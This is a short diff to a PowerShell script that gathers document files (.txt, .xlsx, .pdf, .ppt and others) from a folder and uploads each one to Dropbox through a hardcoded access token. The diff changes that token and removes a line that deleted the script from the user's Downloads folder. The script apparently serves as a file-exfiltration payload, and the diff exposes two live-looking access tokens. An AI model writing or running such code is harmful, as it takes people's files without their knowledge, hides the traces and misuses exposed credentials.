@@ -7,7 +7,7 @@ param (
 [Alias("f")]
 [string]$SourceFilePath
 ) 
-$DropBoxAccessToken = "sl.BP7EgvDlyDqcYrvhlkasFFnWj4GxCDZUCD5tYWuK1zXSDJDrAQl2kYlmwYKBMSMJfyR8cLR2eAleVb98fEaMvRPjgZLtyN5HeV8w3adyzNY35VsHysC9zJTIU83xvD1v0SeaD6OB"   # Replace with your DropBox Access Token
+$DropBoxAccessToken = "sl.BP4JiEzBO1nnT_hCiD32FGij1_mJQLpaepUiRJKcxQR2GxqGUDpKODttKrNz4un87AndzhmZ2UZ_P8K1RErHtSpgTOCo9NtimWJPqry_rAHdlmLnMtuS23VGIm9_SC0AjXIl3gKD"   # Replace with your DropBox Access Token
 $outputFile = Split-Path $SourceFilePath -leaf
 $TargetFilePath="/$outputFile"
 $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
@@ -27,4 +27,4 @@ foreach($files in Get-ChildItem -path $src -Include *.txt,*.xlsx,*.pdf,*.ppt,*.d
     $files | DropBox-Upload
     
 }
-Remove-Item -path C:\Users\$env:username\downloads\test.ps1
+
